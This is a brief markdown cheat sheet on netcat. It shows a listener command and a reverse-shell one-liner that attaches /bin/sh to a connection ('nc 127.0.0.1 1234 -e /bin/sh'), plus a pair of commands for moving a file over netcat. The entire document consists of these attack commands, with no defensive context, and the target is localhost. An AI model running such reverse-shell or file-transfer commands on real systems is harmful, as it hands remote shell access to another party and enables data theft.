# Netcat reverse shell
## reverse shell
```bash
nc -lkp 1234
nc 127.0.0.1 1234 -e /bin/sh
```
## file transfert
```bash
nc -lkp 1234 > out
nc 127.0.0.1 1234 < in
```